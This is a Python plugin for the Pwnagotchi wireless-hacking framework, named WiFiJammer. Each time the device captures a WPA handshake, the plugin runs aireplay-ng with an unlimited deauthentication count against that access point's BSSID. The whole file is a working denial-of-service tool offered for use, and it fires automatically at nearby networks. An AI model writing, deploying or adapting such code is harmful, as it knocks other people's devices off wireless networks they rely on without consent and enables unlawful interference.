import subprocess
import pwnagotchi.plugins as plugins

class WiFiJammer(plugins.Plugin):
    __author__ = 'Deus Dust'
    __version__ = '1.0.2'
    __license__ = 'MIT'
    __defaults__ = {
        'enabled': False,
    }

    def __init__(self):
        self.options = dict()
        self.running = False

    def jam_wifi(self, target_bssid, interface="wlan0"):
        try:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, interface], check=True)
            self.log.info(f"WiFi jamming initiated for {target_bssid}")
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to initiate WiFi jamming: {e}")

    def on_loaded(self):
        self.log.info("WiFi Jammer Plugin loaded")
        self.running = True

    def on_handshake(self, agent, filename, access_point, client_station):
        target_bssid = access_point.bssid
        self.jam_wifi(target_bssid)

    def on_unload(self, ui):
        self.log.info("WiFi Jammer Plugin unloaded")
        self.running = False
